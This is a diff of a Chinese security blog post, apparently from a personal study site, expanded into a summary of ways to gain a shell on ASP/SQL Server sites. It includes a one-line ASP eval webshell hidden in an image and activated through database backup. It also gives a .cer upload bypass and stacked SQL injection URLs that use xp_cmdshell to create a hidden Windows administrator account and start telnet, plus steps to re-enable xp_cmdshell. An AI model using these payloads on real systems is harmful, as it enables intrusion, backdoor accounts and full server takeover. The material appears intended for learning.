@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>数据库备份拿shell · jax&#39;s Studio</title>
+    <title>各种拿shell方法总结 · jax&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >jax&#39;s Studio.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">数据库备份拿shell</a>
+                <a href="#" class="post-name">各种拿shell方法总结</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            数据库备份拿shell
+            各种拿shell方法总结
             <!-- 404 -->
             
         </h1>
@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">958</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">2.4k</span>阅读时长: <span class="post-count reading-time">9 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -419,9 +419,9 @@ height:50vh;
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ http://xxxxxx.com/Manage/databackup/mssqldb.asp</span><br></pre></td></tr></table></figure>
 
 <p>然后菜刀连接一下就行了。</p>
-<h1 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h1><p>先通过弱口令登录进后台管理系统<code>http://127.0.0.1/AccessInj/admin/login.asp</code></p>
+<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>先通过弱口令登录进后台管理系统<code>http://127.0.0.1/AccessInj/admin/login.asp</code></p>
 <p><img src="/2019/11/08/数据库备份拿shell(练习)/20200113222658568.png" alt="在这里插入图片描述">点击备份发现：备份的数据库路径为<code>C:\wwwroot\AccessInj\admin\Databackup\0791idcbackup.mdb</code></p>
-<p><img src="/2019/11/08/数据库备份拿shell(练习)/20200113222714930.png" alt="在这里插入图片描述">然后在联系我们处发现有图片上传的功能:</p>
+<p><img src="/2019/11/08/数据库备份拿shell(练习)/20200113222714930.png" alt="在这里插入图片描述">然后在销售网络管理处发现有图片上传的功能:</p>
 <p><img src="/2019/11/08/数据库备份拿shell(练习)/20200113222725716.png" alt="在这里插入图片描述"></p>
 <p>制作一个图片木马：</p>
 <p>准备一张普通的jpg图片，然后制作一个asp文件。用记事本写入代码<code>&lt;%eval request(&quot;value&quot;)%&gt;</code>，将后缀改为.asp</p>
@@ -435,10 +435,48 @@ height:50vh;
 <p>备份数据库那里，修改当前数据库路径，填写备份数据库名称</p>
 <p>这里，修改当前数据库路径必须为上面刚刚上传的一句话木马图片的路径；这里我把备份数据库名称写为muma.asp；</p>
 <p>用菜刀连接一句话木马就完事了</p>
+<h1 id="上传cer格式的asp马拿shell"><a href="#上传cer格式的asp马拿shell" class="headerlink" title="上传cer格式的asp马拿shell"></a>上传cer格式的asp马拿shell</h1><p>原理就是能把cer格式当成asp来解析</p>
+<p>菜刀连接：</p>
+<p><code>http://10.10.10.132/../Upload/DownFiles/2020011450239893.cer</code></p>
+<h1 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>xp_cmdshell是Sql Server中的一个组件，可以用来执行系统命令<br>在拿到sa口令之后，经常可以通过xp_cmdshell来进行提权。</p>
+<p>方法一：<br>利用xp_cmdshell存储过程来添加windows用户，并提升到管理员权限。<br>然后依然利用xp_cmdshell来打开telnet服务。最后当然是登录上去了。</p>
+<p>方法二：<br>利用sp_addlogin添加sql用户，同样还要提升权限。<br>再用查询分析器连接SQL Server,再利用xp_cmdshell打开telnet服务，最后登录。</p>
+<h2 id="实施"><a href="#实施" class="headerlink" title="实施"></a>实施</h2><p>两种方法都能够得到shell,选择第二种方法。</p>
+<p><strong>一、具体过程</strong></p>
+<p>就往SQL Server里面添加一个用户吧。<br>方法如下：</p>
+<p><code>http://1.1.1.1/news/default.asp?cataid=98986;use master;exec dbo.sp_addlogin user;</code><br>回车后执行，浏览器自动补上了空格，变成：<br><code>http://1.1.1.1/news/default.asp?cataid=98986;use%20master;exec%20dbo.sp_addlogin%20user;</code><br>页面依然正常显示，不过就算你打错了也会正常显示的,不能够判断究竟是否成功。中间的20%吗，其实就是代表空格符的。上面也就相当于在查询分析器里面执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use master;</span><br><span class="line">dbo.sp_addlogin user;注：此处也可以为sp_addlogin user;</span><br></pre></td></tr></table></figure>
+
+<p>前面的url里面同样可以不要dbo，也就是：<br><code>http://1.1.1.1/news/default.asp?cataid=98986;use master;exec sp_addlogin%20user;</code><br>都是一样的。<br>现在我们已经添加了一个用户了，密码现在为空，这里就不管这么多了，反正也是一个过渡的过程，就不加密码了。<br>如果要改密码，可以这样：dbo.password null,password,user;</p>
+<p>dbo.password是修改用密码的存储过程，null是旧密码，password是新密码，<br>user自然就是用户名了。而在我们这个测试中也就是这样子的：<br><code>http://1.1.1.1/news/default.asp?cataid=98986;use master;exec dbo.password null,password,user;</code></p>
+<p>ok,回到主题，现在权限还是不够高，那么就开始提升权限吧，url如下：<br><code>http://1.1.1.1/news/default.asp?cataid=98986;use master;exec dbo.sp_addsrvrolemember user,sysadmin;</code><br>解释一下sysadmin的含义。SQL Server有八种固定服务器角色，具体如下：数据库创建者（DBCREATOR），磁盘管理员（DISKADMIN），进程管理员（PROCESSADMIN），安全管理员（SECURITYADMIN），服务器管理员（SEVERADMIN）安装管理员（SETUPADMIN），系统管理员（SYSADMIN），大容量管理员（BULKADMIN）当然最高权限的是系统管理员（SYSADMIN），默认情况下sa也是系统管理员。dbo.sp_addsrvrolemember是为固定服务器角色分配登录帐户的存储过程。</p>
+<p>用大家经常使用的net命令来对应（本身并没有任何联系，这里拿来对照学习）<br><code>sp_addlogin user;</code></p>
+<p>相当于 </p>
+<p><code>net user user /add</code></p>
+<p><code>sp_password null,password,user</code></p>
+<p>相当于</p>
+<p><code>net user user password</code></p>
+<p><code>sp_addsrvrolemember user,sysadmin</code></p>
+<p>相当于</p>
+<p><code>net localgroup administrators user /add</code></p>
+<p>好了，我们现在已经实现了添加用户并且提升到sysadmin了。下面要做的是添加windows用户并且<br>开启telnet服务。打开我的查询分析器，填入服务器地址，用户名和密码。连接成功了。尝试一下xp_cmdshell是否可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use master;</span><br><span class="line">xp_cmdshell &apos;dir c:&apos;;</span><br></pre></td></tr></table></figure>
+
+<p>记得分号是不可以少的哦。一切正常。显示出来了c:盘下的目录和文件。那就继续下去，<br>添加windows用户：<br><code>xp_cmdshell &#39;net user awen /add&#39;;</code><br>设置好密码：<br><code>xp_cmdshell &#39;net user awen password&#39;;</code><br>提升到管理员：<br><code>xp_cmdshell &#39;net localgroup administrators awen /add&#39;;</code><br>开启telnet服务：<br><code>xp_cmdshell &#39;net start tlntsvr&#39;</code><br>一个老问题就是还有ntlm这个拦路虎。<br>没问题，直接在肉鸡上也添加一个用户名和密码相同的账号然后再以这个帐号运行cmd就可以了。<br><strong>具体的做法</strong></p>
+<p>为cmd.exe创建一个快捷方式，右键点击，在”属性”里面钩上”以其他用户身份运行”。ok,双击。输入刚才的用户名和密码。更加详细的做法清查看阿布的文章<br><a href="http://www.patching.net/abu/gongfang/hacking/easytelnet/index.html" target="_blank" rel="noopener">最快速登录WIN2K TELNET 服务</a></p>
+<p>好了，可以telnet上去了，就写到这里，后面还进行了一些测试，都是大家所熟悉的就不写了。</p>
+<p><strong>二 、回顾与思考</strong></p>
+<p>这入侵测试要是说有难点的话那就是管理员把ipc$,admin$,c$,d$…都关掉了。<br>因此和以前很多的教程有点不同。比如说假设ipc$没有关闭的话，我们很轻松的使用opentelnet这个工具来开telnet,并且也就没有了ntlm这个障碍。</p>
+<p>再对前面的两种方法进行回顾，其实两种方法还是有区别的。<br>假如管理员把xp_cmdshell禁止了，第一种方法就无法进行下去了。<br>有人会说，第二种方法不是也一样要用到xp_cmdshell吗。<br>正确，不过我们还是有办法恢复过来。SQL server 2000的恢复方法是：EXEC sp_addextendedproc xp_cmdshell,@dllname =‘‘xplog70.dll‘‘<br>SQL Server 7.0的恢复方法是：<br>EXEC sp_addextendedproc xp_cmdshell ,@dllname =‘‘xpsql70.dll‘‘<br>你在2000下面是找不到xpsql70.dll的，同样7.0下面也是找不到xplog70.dll。<br>把第二种方法也写出来，没有测试，仅供大家参考：<br>1 添加用户<br><code>http://1.1.1.1/news/default.asp?cataid=98986；use master;exec dbo.xp_cmdshell &#39;net user awen /add&#39;;</code><br>2 更改密码<br><code>http://1.1.1.1/news/default.asp?cataid=98986；use master;exec dbo.xp_cmdshell &#39;net user awen password&#39;;</code><br>3 提升到管理员权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1/news/default.asp?cataid=98986；use master;exec dbo.xp_cmdshell &apos;net localgroup administrators awen /add&apos;;</span><br></pre></td></tr></table></figure>
+
+<p>4 打开telnet服务<br><code>http://1.1.1.1/news/default.asp?cataid=98986；use master;exec dbo.xp_cmdshell &#39;net start tlntsrv&#39;;</code><br>5 依然是采用前面相同的方法登录</p>
+<p>4 打开telnet服务<br><code>http://1.1.1.1/news/default.asp?cataid=98986；use master;exec dbo.xp_cmdshell &#39;net start tlntsrv&#39;;</code><br>5 依然是采用前面相同的方法登录</p>
 <blockquote>
 <p>参考文章</p>
 <p><a href="https://www.jianshu.com/p/728109894bb2" target="_blank" rel="noopener">https://www.jianshu.com/p/728109894bb2</a></p>
 <p><a href="https://blog.csdn.net/qq_19734597/article/details/93715244" target="_blank" rel="noopener">图片木马的三种制作方法</a></p>
+<p><a href="https://www.cnblogs.com/tonykan/p/3452043.html" target="_blank" rel="noopener">SQL注入中利用XP_cmdshell提权的用法(转)</a></p>
 </blockquote>
 
     </article>
@@ -448,7 +486,7 @@ height:50vh;
             <p>原文作者：<a href="https://the-wind-hunter.github.io">jax</a>
             <p>原文链接：<a href="https://the-wind-hunter.github.io/2019/11/08/数据库备份拿shell(练习)/">https://the-wind-hunter.github.io/2019/11/08/数据库备份拿shell(练习)/</a>
             <p>发表日期：<a href="https://the-wind-hunter.github.io/2019/11/08/数据库备份拿shell(练习)/">November 8th 2019, 9:20:39 pm</a>
-            <p>更新日期：<a href="https://the-wind-hunter.github.io/2019/11/08/数据库备份拿shell(练习)/">January 14th 2020, 9:26:53 am</a>
+            <p>更新日期：<a href="https://the-wind-hunter.github.io/2019/11/08/数据库备份拿shell(练习)/">January 14th 2020, 5:28:33 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
        
@@ -458,16 +496,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2019/11/08/Web 安全之 SSRF 漏洞学习实战/" title= "Web安全之SSRF漏洞学习实战">
-                    <div class="nextTitle">Web安全之SSRF漏洞学习实战</div>
+                <a href= "/2019/11/16/Web日志安全分析浅谈/" title= "Web日志安全分析浅谈">
+                    <div class="nextTitle">Web日志安全分析浅谈</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/11/07/pikachu之CSRF练习/" title= "pikachu之CSRF">
-                    <div class="prevTitle">pikachu之CSRF</div>
+                <a href= "/2019/11/08/SQLServer数据库及注入方法/" title= "SQLServer数据库及注入方法">
+                    <div class="prevTitle">SQLServer数据库及注入方法</div>
                 </a>
             
         </li>
@@ -571,7 +609,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#数据库备份拿webshell"><span class="toc-number">1.</span> <span class="toc-text">数据库备份拿webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#例子"><span class="toc-number">1.2.</span> <span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#实操"><span class="toc-number">2.</span> <span class="toc-text">实操</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#数据库备份拿webshell"><span class="toc-number">1.</span> <span class="toc-text">数据库备份拿webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#例子"><span class="toc-number">1.2.</span> <span class="toc-text">例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实操"><span class="toc-number">1.3.</span> <span class="toc-text">实操</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#上传cer格式的asp马拿shell"><span class="toc-number">2.</span> <span class="toc-text">上传cer格式的asp马拿shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xp-cmdshell"><span class="toc-number">3.</span> <span class="toc-text">xp_cmdshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理-1"><span class="toc-number">3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实施"><span class="toc-number">3.2.</span> <span class="toc-text">实施</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1153,9 +1191,116 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 39
+        Total : 42
         </div>
         <!-- search  -->
         
@@ -1166,8 +1311,41 @@ top:50vh;
     
     
     
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/第十三周-web安全之手工测试之前编写的注入环境/" >第十三周web安全之手工测试之前编写的注入环境</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/01/15/WEB 安全之上传漏洞/78599650/" >[Untitled Post]</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
     <div class="archive-year"> 2020 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span><a class="archive-post-title" href= "/2020/01/15/WEB 安全之上传漏洞/" >Web安全之上传漏洞</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1205,17 +1383,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">12/09</span><a class="archive-post-title" href= "/2019/12/09/Windows10下的docker安装与入门 （一）使用docker toolbox安装docker/" >Windows10下的docker安装与入门 （一）使用docker toolbox安装docker</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">12/09</span><a class="archive-post-title" href= "/2019/12/09/Windows10下的docker安装与入门 （二）使用docker引擎在容器中运行镜像/" >Windows10下的docker安装与入门 （二）使用docker引擎在容器中运行镜像 toolbox安装docker</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">12/09</span><a class="archive-post-title" href= "/2019/12/09/Windows10下的docker安装与入门 （三） 创建自己的docker镜像并且在容器中运行它/" >Windows10下的docker安装与入门 （三） 创建自己的docker镜像并且在容器中运行它</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/09</span><a class="archive-post-title" href= "/2019/12/09/Windows10下的docker安装与入门 （一）使用docker toolbox安装docker/" >Windows10下的docker安装与入门 （一）使用docker toolbox安装docker</a>
         </li>
     
     
@@ -1240,12 +1418,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/08</span><a class="archive-post-title" href= "/2019/11/08/数据库备份拿shell(练习)/" >数据库备份拿shell</a>
+            <span class="archive-post-date">11/08</span><a class="archive-post-title" href= "/2019/11/08/Web 安全之 SSRF 漏洞学习实战/" >Web安全之SSRF漏洞学习实战</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/08</span><a class="archive-post-title" href= "/2019/11/08/Web 安全之 SSRF 漏洞学习实战/" >Web安全之SSRF漏洞学习实战</a>
+            <span class="archive-post-date">11/08</span><a class="archive-post-title" href= "/2019/11/08/SQLServer数据库及注入方法/" >SQLServer数据库及注入方法</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/08</span><a class="archive-post-title" href= "/2019/11/08/数据库备份拿shell(练习)/" >各种拿shell方法总结</a>
         </li>
     
     
@@ -1256,11 +1439,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">11/07</span><a class="archive-post-title" href= "/2019/11/07/pikachu之CSRF练习/" >pikachu之CSRF</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/第十三周-web安全之手工测试之前编写的注入环境/" >第十三周web安全之手工测试之前编写的注入环境</a>
         </li>
     
     
@@ -1339,6 +1517,21 @@ top:50vh;
         </li>
     
     
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/2019/08/15/Web安全学习之——基于dvwa的XSS (DOM）学习教程/Web安全学习之——基于dvwa的XSS (DOM）学习教程/" >Web安全学习之——基于dvwa的XSS (DOM）学习教程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span><a class="archive-post-title" href= "/2019/08/11/Web安全学习之——基于dvwa的XSS (Stored)学习教程/Web安全学习之——基于dvwa的XSS (Stored)学习教程/" >Web安全学习之——基于dvwa的XSS (Stored)学习教程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/10</span><a class="archive-post-title" href= "/2019/08/10/web安全学习之——基于dvwa的SQL注入演练(low)/" >SQL注入练习：基于DVWA的SQL注入演练(low)</a>
+        </li>
+    
+    
     
     
     
@@ -1363,7 +1556,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/2019/08/15/Web安全学习之——基于dvwa的XSS (DOM）学习教程/Web安全学习之——基于dvwa的XSS (DOM）学习教程/" >Web安全学习之——基于dvwa的XSS (DOM）学习教程</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/2019/08/06/web安全学习之基于dvwa的SQL Injection (Blind)盲注--思路篇/" >web安全学习之基于dvwa的SQL Injection (Blind)盲注--思路篇</a>
         </li>
     
     
@@ -1378,30 +1571,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/08/22/第三周：数据库系统表相关学习/" >第三周：数据库系统表相关学习</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> 2019 </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/11</span><a class="archive-post-title" href= "/2019/08/11/Web安全学习之——基于dvwa的XSS (Stored)学习教程/Web安全学习之——基于dvwa的XSS (Stored)学习教程/" >Web安全学习之——基于dvwa的XSS (Stored)学习教程</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/10</span><a class="archive-post-title" href= "/2019/08/10/web安全学习之——基于dvwa的SQL注入演练(low)/" >SQL注入练习：基于DVWA的SQL注入演练(low)</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/2019/08/06/web安全学习之基于dvwa的SQL Injection (Blind)盲注--思路篇/" >web安全学习之基于dvwa的SQL Injection (Blind)盲注--思路篇</a>
         </li>
     
     
@@ -1440,6 +1609,8 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="get shell"><span class="iconfont-archer">&#xe606;</span>get shell</span>
     
         <span class="sidebar-tag-name" data-tags="日志分析"><span class="iconfont-archer">&#xe606;</span>日志分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="文件上传漏洞"><span class="iconfont-archer">&#xe606;</span>文件上传漏洞</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
